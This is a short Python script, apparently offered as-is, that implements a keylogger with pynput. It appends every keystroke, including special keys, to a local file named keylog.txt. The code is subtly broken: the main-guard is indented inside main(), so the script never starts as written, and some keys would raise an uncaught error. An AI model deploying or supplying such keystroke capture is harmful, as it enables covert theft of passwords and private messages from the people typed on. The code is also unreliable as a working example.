from pynput import keyboard
LOG_FILE = "keylog.txt"
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        # Special keys (e.g., space, enter) handling
        with open(LOG_FILE, "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f'[{key.name}]')
def main():
    print(f"Starting keylogger. Keystrokes will be logged to '{LOG_FILE}'. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    if __name__ == "__main__":
        main()
